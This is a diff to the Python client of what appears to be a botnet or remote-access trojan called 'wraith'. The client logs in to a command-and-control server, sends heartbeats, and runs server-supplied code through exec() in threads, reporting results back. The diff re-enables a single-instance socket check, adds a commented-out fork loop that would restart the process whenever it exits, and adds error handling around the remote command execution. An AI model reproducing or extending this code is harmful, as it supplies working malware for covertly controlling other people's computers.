@@ -13,10 +13,14 @@ import time
 import platform
 import shutil
 import getpass
+import os
+import subprocess
 from uuid import getnode as get_mac
 
 # Get start time of this wraith
 start_time = time.time()
+
+# START CONSTANTS
 
 # Define some constants
 # The URL where the URL of the C&C server is found. This option was added
@@ -38,11 +42,29 @@ NON_DUPLICATE_CHECK_PORT = 47402
 # Not recommended except for debugging
 INTERACTION_LOGGING = True
 
+# END CONSTANTS
+
+# Now, we fork :)
+"""
+while True:
+    # This spawns a child process. The parent will monitor the child
+    # and re-start it if it exits
+    pid = os.fork()
+    # If this is not the child process (is parent process), start monitoring
+    # child and re-start it in case of failure
+    if pid != 0:
+        try:
+            while True: psutil.Process(pid)
+        except psutil.NoSuchProcess: continue
+    # If this is the child process, exit the loop and continue
+    else: break
+"""
+
 # Check if any other wraiths are active. If so, die. If not, bind
 # to socket to tell all other wraiths we're active.
-#single_instance_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-#try: single_instance_socket.bind(("localhost", NON_DUPLICATE_CHECK_PORT))
-#except: sys.exit(0)
+single_instance_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+try: single_instance_socket.bind(("localhost", NON_DUPLICATE_CHECK_PORT))
+except: sys.exit(0)
 
 # Init crypt
 aes = aes()
@@ -61,7 +83,7 @@ class Wraith(object):
         self.command_queue = [] # Create a queue of all the commands to run
 
         # Start the command running thread
-        self.command_thread = threading.Thread(target=self.run_commands_thread, args=(self,))
+        self.command_thread = threading.Thread(target=self.run_commands_thread)
         self.command_thread.start()
 
     # Make requests to the api and return responses
@@ -179,20 +201,31 @@ class Wraith(object):
     # Run all of the commands in the command_queue
     def run_commands(self):
         for cmd in self.command_queue:
-            self.putresult("SUCCESS", "Started execution of command {}.".format(cmd[0]))
-            # Define a script_main function to prevent errors in case of incorrectly formatted modules
-            script_main = lambda a, b, c: 0
-            # This should define the script_main function
-            exec(cmd[1])
-            # Run the script_main function in a thread
-            script_thread = threading.Thread(target=script_main, args=(self, cmd[0]))
-            script_thread.start()
-            # Remove the command from the list
-            self.command_queue.remove(cmd)
+            try:
+                # Remove the command from the list
+                self.command_queue.remove(cmd)
+                # Define a scope for the exec call so the script_main function can be used later
+                exec_scope = locals()
+                # Define a script_main function to prevent errors in case of incorrectly formatted modules
+                exec_scope["script_main"] = lambda a, b: 0
+                # This should define the script_main function
+                exec(cmd[1], globals(), exec_scope)
+                # Define the script_main function as a thread
+                script_thread = threading.Thread(target=exec_scope["script_main"], args=(
+                    self,
+                    cmd[0]
+                ))
+                # Notify the server that we are now executing the command
+                self.putresult("SUCCESS", "Executing `{}`".format(cmd[0]))
+                # Execute the command
+                script_thread.start()
+            except Exception as e:
+                # If there was an error, report it to the server
+                self.putresult("ERROR - {}".format(e), "Error while executing `{}`".format(cmd[0]))
 
     # Indefinitely run `run_commands`
     def run_commands_thread(self):
-        while True: self.run_commands(); print(1)
+        while True: self.run_commands()
 
 # Create an instance of wraith
 wraith = Wraith(connect_url, CRYPT_KEY, aes)
@@ -203,21 +236,16 @@ wraith = Wraith(connect_url, CRYPT_KEY, aes)
 
 # TODO retry timeout and restart
 # TODO robust server error handling
-# TODO watchers
-# TODO commands
-# TODO streams
-# TODO queue management
-# TODO response returning
 
 while True:
     # If the heartbeat fails for some reason (implicitly execute heartbeat)
     if not wraith.heartbeat():
         # Switch to default key in case switch_key was applied
         wraith.CRYPT_KEY = CRYPT_KEY
-        # Try login every 3 seconds until it works
-        while not wraith.login(): time.sleep(3)
+        # Try login every 10 seconds until it works
+        while not wraith.login(): time.sleep(10)
         # Continue to the next loop (re-send heartbeat)
         continue
 
     # Delay sending hearbeats to prevent DDoSing our own server
-    time.sleep(3)
+    time.sleep(3.2)
